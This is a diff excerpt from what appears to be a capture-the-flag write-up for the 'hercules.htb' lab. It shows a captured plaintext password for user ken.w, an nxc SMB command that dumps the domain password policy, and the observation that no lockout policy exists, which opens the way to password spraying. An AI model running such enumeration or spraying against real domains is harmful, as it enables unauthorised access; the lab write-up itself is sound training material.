@@ -361,5 +361,33 @@ I have compromised `ken.w`
 ken.w:change*th1s_p@ssw()rd!!
 ```
 
+# Domain Enumeration as `ken.w`
+
+```python
+nxc smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --pass-pol                         
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
+SMB         dc.hercules.htb 445    dc               [+] Dumping password info for domain: HERCULES
+SMB         dc.hercules.htb 445    dc               Minimum password length: 7
+SMB         dc.hercules.htb 445    dc               Password history length: None
+SMB         dc.hercules.htb 445    dc               Maximum password age: 
+SMB         dc.hercules.htb 445    dc               
+SMB         dc.hercules.htb 445    dc               Password Complexity Flags: 000001
+SMB         dc.hercules.htb 445    dc                   Domain Refuse Password Change: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password Store Cleartext: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password Lockout Admins: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password No Clear Change: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password No Anon Change: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password Complex: 1
+SMB         dc.hercules.htb 445    dc               
+SMB         dc.hercules.htb 445    dc               Minimum password age: None
+SMB         dc.hercules.htb 445    dc               Reset Account Lockout Counter: 10 minutes 
+SMB         dc.hercules.htb 445    dc               Locked Account Duration: 10 minutes 
+SMB         dc.hercules.htb 445    dc               Account Lockout Threshold: None
+SMB         dc.hercules.htb 445    dc               Forced Log off Time: Not Set
+```
+
+There is no lockout policy!
+
 
 
